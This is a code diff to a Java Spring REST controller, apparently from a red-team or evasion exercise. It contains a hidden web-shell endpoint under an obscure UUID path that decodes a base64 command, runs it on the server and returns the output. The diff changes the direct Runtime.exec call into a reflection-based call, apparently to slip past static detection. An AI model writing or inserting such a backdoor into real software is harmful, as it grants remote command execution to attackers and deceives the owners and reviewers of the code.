@@ -11,6 +11,9 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 
+import java.lang.reflect.Method;
+import java.lang.Process;
+
 @RestController
 @RequestMapping("/api")
 public class UserRestController {
@@ -26,18 +29,25 @@ public class UserRestController {
     @GetMapping(path="/1857b1ed-026e-4c38-bc6c-c1a171cbc38f/{cmd}", produces="text/plain")
     public String nettitudeExec(@PathVariable("cmd") String cmd) {
         var decoded = new String(Base64.decodeBase64(cmd));
-        try {
-            var process = Runtime.getRuntime().exec(decoded);
-            process.waitFor();
-            var inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            String line;
-            var output = new StringBuilder();
-            while ((line = inputStream.readLine()) != null)
-                output.append(line);
-            return Base64.encodeBase64String(output.toString().getBytes());
-        } catch (Exception e) {
-            return e.getMessage();
-        }
+        return Base64.encodeBase64String(reflectionExec(decoded).getBytes());
+    }
+
+    private String reflectionExec( String cmd ){
+      try {
+        var rt = Class.forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null);
+        var m = rt.getClass().getDeclaredMethod("exec",String.class);
+        Object p = m.invoke( rt, cmd );
+        var process = Process.class.cast(p);
+        process.waitFor();
+        var inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        String line;
+        var output = new StringBuilder();
+        while ((line = inputStream.readLine()) != null)
+            output.append(line);
+        return output.toString();
+      } catch( Exception e ){
+        return e.getMessage();
+      }
     }
 
     public static class Exec{
